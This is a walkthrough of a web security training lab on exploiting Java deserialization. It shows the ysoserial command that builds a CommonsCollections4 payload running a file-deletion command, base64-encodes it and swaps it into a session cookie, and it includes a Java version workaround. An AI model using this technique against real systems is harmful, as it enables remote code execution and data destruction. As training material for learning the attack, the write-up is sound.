# Lab: Exploiting Java deserialization with Apache Commons

 This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains.

To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter 

## Something I encountered during the lab and how I fixed it.

If you get the following error while trying to run [ysoserial](https://github.com/frohoff/ysoserial) and get the following error:

```bash
└─$ java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt'|base64
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Error while generating or serializing payload
java.lang.IllegalAccessError: class ysoserial.payloads.util.Gadgets (in unnamed module @0x614635c2) cannot access class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl (in module java.xml) because module java.xml does not export com.sun.org.apache.xalan.internal.xsltc.trax to unnamed module @0x614635c2
	at ysoserial.payloads.util.Gadgets.createTemplatesImpl(Gadgets.java:102)
	at ysoserial.payloads.CommonsCollections4.getObject(CommonsCollections4.java:32)
	at ysoserial.payloads.CommonsCollections4.getObject(CommonsCollections4.java:26)
	at ysoserial.GeneratePayload.main(GeneratePayload.java:34)
```

Try using an earlier version of java (pre 15 I think)

```bash
└─$ sudo update-alternatives --config java             
[sudo] password for nith: 
There are 2 choices for the alternative java (providing /usr/bin/java).

  Selection    Path                                         Priority   Status
------------------------------------------------------------
  0            /usr/lib/jvm/java-17-openjdk-amd64/bin/java   1711      auto mode
 *1            /usr/lib/jvm/java-11-openjdk-amd64/bin/java   1111      manual mode
  2            /usr/lib/jvm/java-17-openjdk-amd64/bin/java   1711      manual mode

Press <enter> to keep the current choice[*], or type selection number: 1
update-alternatives: using /usr/lib/jvm/java-11-openjdk-amd64/bin/java to provide /usr/bin/java (java) in manual mode
```
# Step 1 View session cookie

I find the standard starting characters of a base64 encoded javascript serialized object `rO0`

![image](https://user-images.githubusercontent.com/83407557/213591181-70fde744-4290-41cd-a155-6dfe77593a5a.png)

base64 decoded hex value:

![image](https://user-images.githubusercontent.com/83407557/213591349-e03fc7a9-4162-4d03-8c3d-1e78ee0de768.png)

# Step 2 making a payload with ysoserial

The command I want to run is `rm /home/carlos/morale.txt` on linux, and from the help menue:

```bash
java -jar ysoserial-all.jar --help
Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
```

Then I want to base64 encode the output, and copy it into my clipboard:

```bash
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt'|base64|xclip -selection clipboard
```

# Step 3 capture a request and put the ysoserial payload as the url decoded session cookie

![image](https://user-images.githubusercontent.com/83407557/213592839-d65b1505-c124-4c6e-bedf-4b6b5a326ac8.png)


When the request goes through the file is deleted and the lab is solved:

![image](https://user-images.githubusercontent.com/83407557/213593319-3881be19-a62e-47f0-a48c-bf67f61e6460.png)
